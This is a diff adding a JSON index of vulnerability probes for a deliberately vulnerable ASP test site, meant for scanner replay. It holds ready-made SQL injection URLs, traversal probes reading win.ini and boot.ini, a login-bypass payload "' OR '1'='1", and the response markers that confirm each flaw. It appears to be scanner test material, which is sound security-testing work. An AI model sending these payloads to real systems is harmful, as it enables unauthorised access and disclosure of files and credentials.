+        "id": "ta-sqli-templatize-item-02",
+        "title": "SQL Injection in Templatize.asp item parameter - payload '",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-03",
+        "title": "SQL Injection in Templatize.asp item parameter - payload '%22",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27%2522",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'%22",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-04",
+        "title": "SQL Injection in Templatize.asp item parameter - payload 9,9,9",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=9%2C9%2C9",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "9,9,9",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-05",
+        "title": "SQL Injection in Templatize.asp item parameter - payload 'bad_bad_value",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27bad_bad_value",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'bad_bad_value",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-06",
+        "title": "SQL Injection in Templatize.asp item parameter - payload bad_bad_value'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=bad_bad_value%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "bad_bad_value'",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-07",
+        "title": "SQL Injection in Templatize.asp item parameter - payload '+OR+'",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27%2BOR%2B%27",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'+OR+'",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-08",
+        "title": "SQL Injection in Templatize.asp item parameter - payload 'WHERE",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27WHERE",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'WHERE",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-09",
+        "title": "SQL Injection in Templatize.asp item parameter - payload ;",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%3B",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": ";",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-sqli-templatize-item-10",
+        "title": "SQL Injection in Templatize.asp item parameter - payload 'OR",
+        "category": "sqli",
+        "severity": "critical",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=%27OR",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "'OR",
+        "expected_indicators": [
+          "SQL error or template error",
+          "server-side exception",
+          "response differs from item=html/about.html baseline",
+          "database error disclosure"
+        ]
+      },
+      {
+        "id": "ta-lfi-templatize-showforum",
+        "title": "Local file include through Templatize.asp item - include ASP file",
+        "category": "path_traversal",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "showforum.asp",
+        "expected_indicators": [
+          "forum content appears inside template",
+          "included ASP page content",
+          "no allowlist enforcement"
+        ]
+      },
+      {
+        "id": "ta-lfi-templatize-search",
+        "title": "Local file include through Templatize.asp item - include Search.asp",
+        "category": "path_traversal",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=search.asp",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "search.asp",
+        "expected_indicators": [
+          "search form appears inside template",
+          "included ASP page content",
+          "no allowlist enforcement"
+        ]
+      },
+      {
+        "id": "ta-header-csp-missing",
+        "title": "Content Security Policy header missing",
+        "category": "security_headers",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": null,
+        "expected_indicators": [
+          "Content-Security-Policy header absent"
+        ]
+      },
+      {
+        "id": "ta-header-xcto-missing",
+        "title": "X-Content-Type-Options header missing",
+        "category": "security_headers",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": null,
+        "expected_indicators": [
+          "X-Content-Type-Options header absent"
+        ]
+      },
+      {
+        "id": "ta-csrf-login-missing-token",
+        "title": "Login form missing anti-CSRF token",
+        "category": "csrf",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F",
+        "raw_payload": null,
+        "expected_indicators": [
+          "form has no hidden CSRF token",
+          "no unpredictable anti-CSRF value"
+        ]
+      },
+      {
+        "id": "ta-csrf-register-missing-token",
+        "title": "Register form missing anti-CSRF token",
+        "category": "csrf",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F",
+        "raw_payload": null,
+        "expected_indicators": [
+          "form has no hidden CSRF token",
+          "no unpredictable anti-CSRF value"
+        ]
+      },
+      {
+        "id": "ta-param-override-search",
+        "title": "HTTP Parameter Override / duplicate parameter behavior in Search.asp",
+        "category": "input_handling",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%0A%2F%2F&tfSearch=%0Aalert&tfSearch=%3Cscript%3E%2F%2F",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%0A%2F%2F&tfSearch=%0Aalert&tfSearch=%3Cscript%3E%2F%2F",
+        "raw_payload": null,
+        "expected_indicators": [
+          "duplicate tfSearch accepted",
+          "last/first parameter wins behavior",
+          "response uses one duplicate value unpredictably"
+        ]
+      },
+      {
+        "id": "ta-error-disclosure-search",
+        "title": "Application error disclosure in Search.asp",
+        "category": "error_disclosure",
+        "severity": "medium",
+        "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=ZAP",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Search.asp?tfSearch=test",
+        "raw_payload": "ZAP",
+        "expected_indicators": [
+          "ASP error",
+          "Microsoft OLE DB",
+          "ODBC",
+          "stack trace",
+          "database error"
+        ]
+      },
+      {
+        "id": "ta-robots-disallow-all",
+        "title": "robots.txt discloses site-wide disallow rule",
+        "category": "information_disclosure",
+        "severity": "low",
+        "url": "http://testasp.vulnweb.com/robots.txt",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": null,
+        "expected_indicators": [
+          "User-agent: *",
+          "Disallow: /"
+        ]
+      },
+      {
+        "id": "ta-iis-version-disclosure",
+        "title": "Microsoft IIS version disclosure",
+        "category": "information_disclosure",
+        "severity": "low",
+        "url": "http://testasp.vulnweb.com/",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": null,
+        "expected_indicators": [
+          "Server: Microsoft-IIS",
+          "IIS/6.0"
+        ]
+      }
+    ],
+    "manual_requests": [
+      {
+        "id": "ta-traversal-templatize-dotdot-winini",
+        "title": "Directory Traversal candidate in Templatize.asp item - Windows win.ini probe",
+        "category": "path_traversal",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "..\\..\\..\\..\\windows\\win.ini",
+        "expected_indicators": [
+          "[fonts]",
+          "[extensions]",
+          "for 16-bit app support",
+          "Windows INI file markers"
+        ],
+        "disabled_reason": null,
+        "form_fields": null
+      },
+      {
+        "id": "ta-traversal-templatize-bootini",
+        "title": "Directory Traversal candidate in Templatize.asp item - boot.ini probe",
+        "category": "path_traversal",
+        "severity": "high",
+        "url": "http://testasp.vulnweb.com/Templatize.asp?item=..%5C..%5C..%5C..%5Cboot.ini",
+        "method": "GET",
+        "baseline_url": "http://testasp.vulnweb.com/Templatize.asp?item=html%2Fabout.html",
+        "raw_payload": "..\\..\\..\\..\\boot.ini",
+        "expected_indicators": [
+          "[boot loader]",
+          "[operating systems]",
+          "multi(0)disk(0)rdisk",
+          "boot.ini markers"
+        ],
+        "disabled_reason": null,
+        "form_fields": null
+      },
+      {
+        "id": "ta-sqli-login-post-manual-candidate",
+        "title": "Login bypass SQL Injection candidate in Login.asp POST credentials",
+        "category": "sqli",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "' OR '1'='1",
+        "expected_indicators": [
+          "successful login without valid password",
+          "Set-Cookie/authenticated session",
+          "redirect to Default.asp"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {}
+      }
+    ],
+    "blocked_destructive_payloads": [],
+    "index_type": "real_target_full_payload_links",
+    "usage": "copy_paste_or_scanner_replay",
+    "safety_note": "Only replay entries where scanner_auto_test_safe is true and destructive/manual_only are false."
+  },
+  "light_subset": {
+    "enabled": true,
+    "source_profile": "deep-real-test",
+    "selection_policy": "Up to 4 safe, non-destructive findings for light scans. Deep scans use the full test JSON.",
+    "normalized_findings_count": 4
+  }
+}
